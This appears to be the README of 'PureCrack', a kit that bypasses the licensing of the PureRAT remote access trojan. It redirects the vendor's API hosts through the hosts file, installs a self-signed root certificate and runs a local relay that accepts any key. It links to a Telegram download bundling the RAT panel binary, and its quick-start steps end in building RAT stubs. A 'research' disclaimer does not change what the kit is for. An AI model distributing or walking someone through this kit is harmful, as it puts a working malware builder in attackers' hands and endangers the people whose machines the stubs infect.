# PureCrack

**Security research kit** — reconstructs PureRAT v4.0.9596's license-API surface for offline analysis and stub generation. C# implementation of the protocol RE originally published in the Python workspace.

This repository contains **source code only**. No malware binaries are included.

From [Crypter.Cloud](https://Crypter.Cloud) and [@CrypterGateway](https://t.me/CrypterGateway)

## Download Full Kit

To build and run PureCrack, you need the panel files (PureRAT.exe, data.pak, Plugins/) plus binary dependencies (protobuf-net.dll, compile_response.bin). Download the complete pre-assembled kit including everything:

**🔗 [Download PureCrack Full Kit](https://t.me/clownsprotector/15)**

The full kit includes:
- All source code from this repo (pre-built optional)
- protobuf-net.dll + compile_response.bin (not in this repo)
- PureRAT v4.0.9596.35655 panel binary
- data.pak + GeoIP.mmdb
- PureHelper plugins
- Compiled PureCrack.exe (standalone, no build required)

Or get the panel files yourself and build from source (see Building From Source below).

## Quick Start (from full kit)

1. Extract the full kit
2. Run `PureCrack.exe` as Administrator (UAC prompts automatically)
3. Wait for the **READY** banner
4. Click **Login** in the panel (any key works)
5. Go to **Builder Settings → Build** to produce a stub

## Building From Source

Requires .NET SDK 8.x (targets .NET Framework 4.7.2):

```
dotnet restore
dotnet build -c Release
```

Output: `bin/Release/PureCrack.exe`

Before building, place the following in the `panel/` directory:
- `PureRAT.exe` (v4.0.9596)
- `PureRAT.exe.config`
- `data.pak`
- `data/GeoIP.mmdb`
- `Plugins/PureHelper.dll`
- `Plugins/PureHelper.Client.dll`

See `panel/README.md` for details. Alternatively, set `PURE_PANEL_EXE` env var at runtime to point at an existing PureRAT install.

## Source Layout

```
PureCrack/
├── PureCrack.csproj          net472 + Roslyn 4.8 + Costura.Fody
├── app.manifest              requireAdministrator + Win10/11 compat
├── FodyWeavers.xml           Costura single-EXE config
│
├── src/
│   ├── Program.cs            entry point, subcommands, orchestration
│   ├── Preflight.cs          startup sanity checks
│   ├── Build/
│   │   ├── StubBuilder.cs    Roslyn-based 5-step build pipeline
│   │   ├── BuildConfig.cs    per-build config DTO
│   │   └── InnerProto.cs     GClass3 encoder + GClass2 wrapper
│   ├── Crypto/
│   │   └── Symmetric.cs      AES-256-CBC + 3DES-CBC helpers
│   ├── Panel/
│   │   ├── PanelLauncher.cs  locate + launch PureRAT.exe
│   │   └── SettingsAutoFix.cs reorder Settings.json IPs
│   ├── Relay/
│   │   ├── TlsRelay.cs       TcpListener + SslStream + ThreadPool
│   │   ├── RouteHandlers.cs  /validate /compile /heartbeat endpoints
│   │   └── CaptureWriter.cs  dump requests to runs/captures/
│   ├── Setup/
│   │   ├── HostsManager.cs   api*.purecoder.io -> 127.0.0.1
│   │   └── CertManager.cs    self-signed SAN cert + Root install
│   ├── Util/
│   │   ├── Log.cs            ANSI colored logger
│   │   ├── Workspace.cs      path resolution
│   │   ├── EmbeddedAssets.cs manifest-resource reader
│   │   └── Polyfills.cs      IsExternalInit shim for net472
│   └── Wire/
│       └── ProtoNet.cs       protobuf wire encoder/decoder
│
├── assets/
│   └── inner/                32 .cs sources + Loader.tmpl
│
├── panel/
│   └── README.md             instructions for acquiring PureRAT.exe
│
└── docs/
    ├── OVERVIEW.md           full RE narrative
    ├── WIRE_FORMAT.md        field-level protobuf reference
    ├── PROTECTION_ANALYSIS.md protection layer analysis
    ├── MEMORY_DUMP_RECIPE.md procdump + carve workflow
    ├── THREAT_INTEL.md       PureCoder/PureCrack background
    └── PORT_NOTES.md         C# port design diary
```

## How It Works

PureRAT clients (stubs) phone home to `api.purecoder.io` for license checks. PureCrack:

1. Redirects `api*.purecoder.io` to `127.0.0.1` via the hosts file
2. Generates a self-signed SAN cert and installs it as a trusted root
3. Listens on `:443`, decrypts requests with the panel's static AES key
4. Handles four API endpoints:
   - `/validate` — any-key-OK login response
   - `/compile` — Roslyn-compiled stub using the 32 inner source files
   - `/heartbeat` — minimal ACK
   - `/update-plugins` — same ACK
5. Every request is dumped to `runs/captures/` for inspection

## Commands

```
PureCrack.exe                     Default — full kit (relay + panel)
PureCrack.exe smoke-build         Exercise build pipeline only
PureCrack.exe help                Usage + env var reference
```

## License

This project is provided for **educational and research purposes only**. The authors are not responsible for any misuse.

PureRAT is the intellectual property of PureCoder. PureCrack is an independent reverse-engineering research project with no affiliation to PureCoder.
